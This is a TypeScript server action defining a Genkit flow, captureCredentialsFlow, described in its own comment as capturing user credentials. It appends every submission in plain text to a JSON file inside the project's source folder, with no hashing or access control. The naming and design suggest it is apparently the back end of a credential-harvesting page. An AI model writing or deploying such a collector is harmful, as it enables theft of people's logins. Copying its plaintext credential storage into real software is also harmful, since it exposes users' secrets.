'use server';
/**
 * @fileOverview A flow to capture user credentials and save them to a local JSON file.
 *
 * - captureCredentialsFlow - A Genkit flow that receives and saves user credentials.
 * - CaptureCredentialsOutput - The return type for the captureCredentialsFlow function.
 */

import { ai } from '@/ai/genkit';
import type { CredentialsInput } from '@/ai/types/credentials';
import { CredentialsInputSchema } from '@/ai/types/credentials';
import { z } from 'genkit';
import * as fs from 'fs/promises';
import * as path from 'path';

const CaptureCredentialsOutputSchema = z.object({
  success: z.boolean(),
  message: z.string().optional(),
});
export type CaptureCredentialsOutput = z.infer<typeof CaptureCredentialsOutputSchema>;

export async function captureCredentials(
  input: CredentialsInput
): Promise<CaptureCredentialsOutput> {
  return await captureCredentialsFlow(input);
}

const captureCredentialsFlow = ai.defineFlow(
  {
    name: 'captureCredentialsFlow',
    inputSchema: CredentialsInputSchema,
    outputSchema: CaptureCredentialsOutputSchema,
  },
  async (input: CredentialsInput): Promise<CaptureCredentialsOutput> => {
    try {
      const dataFilePath = path.join(process.cwd(), 'src', 'ai', 'flows', 'data.json');
      
      let existingData: CredentialsInput[] = [];
      try {
        const fileContent = await fs.readFile(dataFilePath, 'utf-8');
        existingData = JSON.parse(fileContent);
      } catch (error: any) {
        // If the file doesn't exist or is empty, start with an empty array.
        if (error.code !== 'ENOENT') {
          console.warn('Warning reading data.json, will overwrite:', error);
        }
      }

      existingData.push(input);

      await fs.writeFile(dataFilePath, JSON.stringify(existingData, null, 2), 'utf-8');

      return { success: true };
    } catch (error: any) {
      console.error('Error saving credentials to data.json:', error);
      return { success: false, message: error.message };
    }
  }
);
